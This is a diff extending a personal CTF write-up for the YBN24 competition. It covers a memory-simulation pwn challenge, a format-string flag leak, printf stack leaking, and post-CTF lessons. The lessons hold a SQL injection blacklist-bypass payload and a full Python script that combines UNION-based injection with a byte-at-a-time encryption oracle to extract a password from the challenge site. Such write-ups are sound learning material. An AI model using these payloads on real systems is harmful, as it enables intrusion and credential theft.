@@ -289,7 +289,103 @@ print(p.recvline())
 `YBN24{wH0_kN0w5_8a5H_R4nD0m_w4sn7_s0_rAnD0m_4ft3r_4ll}`
 > The seed can actually be found within the same connection to the server, thus we can both find the seed and then immediately start submitting guesses
 ## Memory sim
-TODO: (1 a 898),(1 d 897),(2 897)
+A python pwn challenge that simulates memory(?). The goal of this challenge is to access a string from a restricted address. The functions for reading and writing to the memory are:
+```python
+def write_string(s, ind):  
+	sl = len(s)  
+    if ind+sl >= len(MEMORY):  
+        return -1  
+    MEMORY[ind-1] = len(s)  
+    for i in range(ind, ind+sl):  
+        MEMORY[i] = ord(s[i-ind])  
+    return (ind-1) % MLEN
+def read_string(ind):  
+	stringLen = MEMORY[ind]  
+    ind += 1  
+    if ind+stringLen >= len(MEMORY):  
+        return -1  
+    return "".join([chr(i) for i in MEMORY[ind:ind+stringLen]])
+```
+* `write_string()`, which writes the ordinals of the characters in  string `s`  at the address space `[ind, ind+string length)`, and writes the length of the string at index `ind-1`. It returns the address we can use with `read_string()` to obtain the string from memory
+* `read_string()`, which reads the length of the string at address `ind`, and reads the integers as characters from memory at the address space `[ind+1, ind+string length+1)`
+We then have the main program, responsible for taking and validating user input before calling those functions
+```python
+from string import printable
+MLEN = 1000  
+READ_ONLY = 900  
+MEMORY = [0] * MLEN  
+MENU = """1. write  
+2. read  
+>> """
+flag = "YBN24{?????????????????????????????????????}"  
+write_string(flag, 950)  
+cached = []  
+while True:  
+    choice = int(input(MENU))  
+    if choice == 1:  
+        ustr = str(input("Enter string\n>> "))  
+        if not all(i in printable for i in ustr):  
+            print("invalid string")  
+            continue  
+        uid = int(input("Enter address\n>> "))  
+        if uid >= READ_ONLY:  
+            print("sorry, this region's read only")  
+            continue  
+        res = write_string(ustr, uid)  
+        if res == -1:  
+            print("error")  
+            continue  
+        print("string written successfully! You can view it at", res)  
+        cached.append(res)  
+        print(f"You can now access {cached}")  
+  
+    elif choice == 2:  
+        uid = int(input("Enter address\n>> "))  
+        if uid not in cached:  
+            print("Hey, no out of bounds access! >:(")  
+            continue  
+        res = read_string(uid)  
+        if res == -1:  
+            print("error")  
+            continue  
+        print("Your string:", res)  
+  
+    else:  
+        print("Invalid choice!")
+```
+Here, we are restricted from writing at the read only region, and our input has to be a printable character. It should be noted there are no restrictions that prevent us from reading into the restricted region. By having `read_string` fetch the length of its string from an address where a character was stored instead of the strings length, we could read into the restricted region.
+```
+write_string('d', 898)
+| Address  |        897        |   898    |
+|----------|-------------------|----------|
+| Value    | 1 (String length) | ord('d') |
+                                 ^ We read from this address
+```
+However, there is a check in place to ensure we can only read from addresses we've written to. If the address is not in `cache`, we are prevented from reading there. We can circumvent this by simply writing a string at `address+1` to add `address` to the cache, then write our payload.
+```
+write_string('a', 899)
+| Address  | 898 |        899        |   900    |
+|----------|-----|-------------------|----------|
+| Value    |     | 1 (string length) | ord('a') |
+Cache: [898]
+
+write_string('d', 898)
+| Address  |        898        |   899    |   900    |
+|----------|-------------------|----------|----------|
+| Value    | 1 (string length) | ord('d') | ord('a') |
+Cache: [897, 898]
+
+read_string(898)
+| Address  |        898        |   899    |   900    |
+|----------|-------------------|----------|----------|
+| Value    | 1 (string length) | ord('d') | ord('a') |
+ This is the string length read ^ 
+
+```
+Thus, our input is as such:
+1. 1 a 899
+2. 1 d 898
+3. 2 898
 `YBN24{n3g4tive_inDexeS_aNd_struCt_ov3rfl0W!}`
 ## View source revenge
 A site that allows us to view the contents of any file
@@ -516,8 +612,158 @@ Here, the result from the query is being cast to a string. This is usually not r
 ![[Pasted image 20241202215911.png]]
 The final step is to access `/admin`, giving us the flag
 ![[Pasted image 20241202220039.png]]
-
 `YBN24{8@ba_!S_A_B@d_PRo6rAmm3R}`
+> It should be mentioned a team managed to find a way to gain an invalid uuid without leaking the flask secret. After the session uuid is set and before the secret is saved, there is a check to ensure the command prefix is valid. If the prefix was invalid, only the uuid is saved and the function returns, hence generating an "invalid" uuid.
+> ![[Pasted image 20241202233419.png]]
+> You can also leak the flag from the format string itself
+> ```
+> {response.init.globals[os].environ[FLAG]}
+> ```
+
 ## Needle in a haystack
-TODO
+TODO. This is more for personal use. Using `printf()` with user supplied input is dangerous as it allows memory in the stack to be leaked. We use `%<n>$s` here to brute force leaking the flag from the stack, where n is some number. I have yet to figure out how `printf()` calculates its offsets/addresses to read from based on the number we supply and the potential data types of varying arguments before the nth one. 
 `YBN24{FL4G_1N_4_ST4CK_XDDDDDD}`
+
+# Post ctf lessons
+## Essay evaluator
+Usage of `...`  is a valid python object.
+https://stackoverflow.com/questions/772124/what-does-the-ellipsis-object-do
+## RentAHitman 1
+Always consider the full scope of a potential vulnerability you are targeting. In this case, I was too focused on trying not to trip the blacklist detection.
+```python
+def detect_sqli(sql):  
+    # List of common SQL keywords and characters often used in SQL injection  
+    # TODO There are sqlite specific keywords such as ATTACH  
+    disallowed_patterns = [  
+        r"SELECT", r"UNION", r"JOIN", r"FROM", r"WHERE", r"ON",  
+        r"OR", r"AND", r"NOT", r"IN", r"LIKE", r"DROP", r"INSERT",  
+        r"DELETE", r"UPDATE", r"EXEC", r"EXECUTE", r"CREATE", r"ALTER",  
+        "--", "#", ";", "/*", "*/", "@@", "0x", "'", "\"", "`", "-", "/", "*"  
+    ]  
+    # https://gist.github.com/cyberheartmi9/b4a4ff0f691be6b5c866450563258e86  
+    # TODO OR and AND can be bypassed with || and &&  
+  
+    # Escape special characters and combine patterns into a single regex  
+    escaped_patterns = [re.escape(pattern) if not pattern.isalnum() else pattern for pattern in disallowed_patterns]  
+    combined_pattern = re.compile("|".join(escaped_patterns), re.IGNORECASE)  
+  
+    # Check if any disallowed pattern is found in the SQL query  
+    if combined_pattern.search(sql):  
+        return True  
+  
+    return False
+
+@app.route('/filter', methods=["POST"])  
+def filter():  
+    if not session.get('is_logged_in'):  
+        return redirect(url_for('login'))  
+    with connect(g.uuid) as conn:  
+        print(f"Mimetype is {request.mimetype_params}")  
+        search = request.form['search']  
+        print(f"Search term is \n{search}")  
+        # Split the terms and remove any containing blacklisted terms  
+        terms = search.split(" ")  
+        query = "SELECT name,location,description from targets"  
+        for term in terms:  
+            if detect_sqli(term):  
+                print(f"Removing blacklisted term {term}")  
+                terms.remove(term)  
+        if terms:  
+            location_match = " OR ".join(f"name LIKE '%{term}%'" for term in terms)  
+            name_match = " OR ".join(f"location LIKE '%{term}%'" for term in terms)  
+            description_match = " OR ".join(f"description LIKE '%{term}%'" for term in terms)  
+            query += " WHERE " + " OR ".join([location_match,name_match,description_match])  
+            print(query)  
+        cursor = conn.execute(query)  
+        targets = cursor.fetchall()  
+        targets = list(targets)  
+    return jsonify(targets)
+```
+However, preventing SQLI in this code consists of not only *detection*, but also *removal* of the terms. The terms are split by spaces into a list, then a for loop iterates and removes each term if SQLI is detected. The issue lies in the loop
+```python
+        for term in terms:  
+            if detect_sqli(term):  
+                print(f"Removing blacklisted term {term}")  
+                terms.remove(term)  
+```
+If an item is removed during iteration, the loop will skip over the next item and no detection or removal of the item happens. https://stackoverflow.com/a/1207427.
+Hence, a query like `Next_term_is_skipped_SELECT %'/*You_are_free_to_execute_sql_here*/SELECT/**/BLAHBLAH.../**/;--` will allow for SQLI. 
+(Comments are used to bypass spaces and prevent query from being split)
+> ![[Pasted image 20241204114515.png]]
+
+Interestingly, chatgpt would have also pointed out the solution if you chatgpt'd hard enough
+https://chatgpt.com/share/674fd0a1-2870-800e-a95d-b7a7bc4bdc3e (Issue not mentioned)
+https://chatgpt.com/share/674fd0b0-6dec-800e-a95f-92c880c7ef2d (Issue mentioned)
+## RentAHitman 2
+https://en.wikipedia.org/wiki/Padding_oracle_attack
+"To my knowledge, Since AES-CBC block cipher is being used with a constant IV and a constant SALT, we are able to use an algorithm to guess each character one by one."
+```python
+import requests
+from Crypto.Util.number import bytes_to_long
+import time
+import string
+BASE_URL = "https://rentahitman-com-1-rentahitman-chall.ybn.sg" #TODO
+
+# range for possible flag chars
+ascii_start = 32
+ascii_end = 126
+
+block_byte_start = 0
+block_byte_end = 16
+block_byte_size = 16
+pw = ""
+payload_length = block_byte_end-len(pw)-1
+starting_bytes = "a"*payload_length
+uuid = "075dccc5-3b76-4a15-9306-e943c676132b"
+session = "eyJpc19sb2dnZWRfaW4iOnRydWUsInVzZXJfaWQiOjN9.Z0n1ng.40KJnmVn8-Gur4fZ-4nCKLQEJCI"
+GCLB = "CKDj2fyUjcrZ5AEQAw"
+UserAgent = "YesButNo/1.0"
+# attack until get last byte, b"}", attacks for more than 16 bytes
+def get_encrypted_pw(pw):
+    response = requests.post(BASE_URL+"/signup", data={"username": pw, "password": pw},cookies={"uuid":uuid,"session":session,"GCLB":GCLB},headers={"User-Agent":UserAgent})
+    sqli = f"-- dhadhlsjldas%'/**/UNION/**/SELECT/**/username,password,userId/**/FROM/**/users/**/WHERE/**/username='{pw}'--"
+    response = requests.post(BASE_URL+"/filter", data={"search": sqli},cookies={"uuid":uuid,"session":session,"GCLB":GCLB},headers={"User-Agent":UserAgent})
+    data = response.json()[0]
+    if data[0] != pw:
+        print(f"Error: {data} {pw}")
+        exit()
+    return bytes.fromhex(data[1])
+
+chars = string.ascii_letters + string.digits
+for i in range(16):
+    # payload = hex(bytes_to_long(starting_bytes))[2:]
+    actual_leak = get_encrypted_pw(starting_bytes)
+
+    # Starting payload for block attack
+    part_payload = starting_bytes + pw
+
+    # running through all possible printable chars
+    found = False
+    for ascii in chars:
+        char = ascii
+        if char in ["'", '"', "\\", " "]:
+            continue
+        payload = part_payload + char
+        test_leak = get_encrypted_pw(payload)
+
+        # checking if the actual leak's block and test_leak's first block match
+        if test_leak[block_byte_start:block_byte_end] == actual_leak[block_byte_start:block_byte_end]:
+            print(f"Found: {char}")
+            pw += char
+            found = True
+            # going into next block already
+            if payload_length % block_byte_size == 1:
+                payload_length += block_byte_size - 1
+                block_byte_start += block_byte_size
+                block_byte_end += block_byte_size
+            else:
+                payload_length -= 1
+
+            starting_bytes = "a"*payload_length
+            part_payload = starting_bytes + pw
+            break
+    if not found:
+        break
+print(pw)
+```
+Sol by Baba is dead
